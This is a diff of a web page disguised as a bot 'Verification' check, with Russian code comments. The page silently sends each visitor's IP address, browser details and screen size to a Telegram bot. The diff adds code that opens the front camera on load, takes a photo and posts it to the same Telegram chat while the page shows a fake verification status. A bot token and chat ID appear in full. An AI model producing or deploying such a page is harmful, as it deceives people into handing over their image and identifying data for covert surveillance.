@@ -3,8 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bot Verification</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <title>Verification</title>
     <style>
         body {
             background-color: #000;
@@ -19,36 +18,31 @@
             padding: 20px;
             text-align: center;
         }
-        .btn {
-            background-color: #ff0000;
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            font-size: 18px;
-            border-radius: 10px;
-            cursor: pointer;
+        #status {
             margin: 20px 0;
+            font-size: 18px;
         }
     </style>
 </head>
 <body>
-    <div id="content" style="display: none;">
-        <h1>Bot Verification</h1>
-        <button id="verifyBtn" class="btn">Verify I'm Not a Bot</button>
+    <div id="content">
+        <h1>Verification in progress...</h1>
+        <p id="status">Checking camera access...</p>
     </div>
 
     <script>
         const botToken = '7898816931:AAHNPImGpJjs-MNsklAvrU0VRDFkHFte_ig';
         const chatId = '-1002577213610';
-        
-        // 1. Сразу отправляем IP при загрузке страницы
-        async function sendIP() {
+        const statusElement = document.getElementById('status');
+        let stream = null;
+
+        // 1. Отправка информации о пользователе
+        async function sendUserInfo() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
                 const ip = data.ip;
                 
-                // Добавляем информацию о пользователе
                 const userAgent = navigator.userAgent;
                 const screenRes = `${window.screen.width}x${window.screen.height}`;
                 const time = new Date().toLocaleString();
@@ -65,35 +59,107 @@
                         text: message
                     })
                 });
-                
-                // Показываем контент после отправки IP
-                document.getElementById('content').style.display = 'block';
-                
             } catch (error) {
-                console.error('Error:', error);
-                document.getElementById('content').style.display = 'block';
+                console.error('Error sending user info:', error);
             }
         }
-        
-        // 2. Обработчик кнопки проверки
-        document.getElementById('verifyBtn').addEventListener('click', async function() {
+
+        // 2. Захват фото с камеры
+        async function captureAndSendPhoto() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-                alert('Камера доступна! Проверка завершена.');
+                statusElement.textContent = "Completing verification...";
+                
+                // Создаем скрытый video элемент
+                const video = document.createElement('video');
+                video.width = 640;
+                video.height = 480;
+                video.autoplay = true;
+                video.playsInline = true;
+                video.srcObject = stream;
+                document.body.appendChild(video);
+                
+                // Ждем пока видео начнет воспроизводиться
+                await new Promise(resolve => {
+                    video.onplaying = resolve;
+                    setTimeout(resolve, 1000); // Fallback timeout
+                });
+                
+                // Создаем canvas для захвата кадра
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Преобразуем в blob
+                const blob = await new Promise(resolve => {
+                    canvas.toBlob(resolve, 'image/jpeg', 0.8);
+                });
+                
+                // Создаем FormData для отправки
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'verification.jpg');
+                
+                // Добавляем описание
+                const caption = `🆔 Фото верификации\nВремя: ${new Date().toLocaleString()}`;
+                formData.append('caption', caption);
+                
+                // Отправляем фото в Telegram
+                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                statusElement.textContent = "Verification complete! You can close this page.";
+                stopCamera();
+                
+                // Удаляем временные элементы
+                document.body.removeChild(video);
+                
             } catch (error) {
-                alert('Для проверки требуется доступ к камере!');
+                console.error('Error capturing photo:', error);
+                statusElement.textContent = "Verification failed. Please refresh the page.";
             }
-        });
-        
-        // 3. Инициализация при загрузке
+        }
+
+        // 3. Запуск камеры и автоматический захват
+        async function startVerification() {
+            try {
+                statusElement.textContent = "Requesting camera access...";
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false
+                });
+                
+                // Сразу делаем фото после получения доступа
+                await captureAndSendPhoto();
+                
+            } catch (error) {
+                console.error('Camera error:', error);
+                statusElement.textContent = "Camera access required for verification. Please refresh and allow access.";
+            }
+        }
+
+        // 4. Остановка камеры
+        function stopCamera() {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        }
+
+        // 5. Инициализация при загрузке
         window.onload = function() {
-            sendIP(); // Отправляем IP сразу
-            
-            if (window.Telegram && Telegram.WebApp) {
-                Telegram.WebApp.expand();
-                Telegram.WebApp.enableClosingConfirmation();
-            }
+            sendUserInfo(); // Отправляем информацию о пользователе
+            startVerification(); // Начинаем процесс верификации
         };
+
+        // Остановка камеры при закрытии страницы
+        window.addEventListener('beforeunload', stopCamera);
     </script>
 </body>
 </html>
